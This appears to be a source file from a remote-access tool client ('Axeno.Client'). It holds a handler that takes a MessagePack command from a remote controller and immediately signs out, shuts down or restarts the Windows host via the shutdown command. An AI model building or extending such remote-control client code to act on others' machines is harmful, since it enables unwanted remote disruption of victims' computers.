using Axeno.Client.MessagePack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Axeno.Client.Networking.Functions
{
    internal class PowerControl
    {
        public static void HandlePower(MsgPack msgpack)
        {
            string command = msgpack.ForcePathObject("Option").AsString;
            switch (command)
            {
                case "Signout":
                    {
                        Signout();
                        break;
                    }
                case "Shutdown":
                    Shutdown();
                    break;
                case "Restart":
                    {
                        Restart();
                        break;
                    }
            }
        }
        public static void Signout()
        {
            Process.Start("shutdown", "/l");

        }
        public static void Shutdown()
        {
            Process.Start("shutdown", "/s /t 0");

        }
        public static void Restart()
        {
            Process.Start("shutdown", "/r /t 0");

        }
    }
}
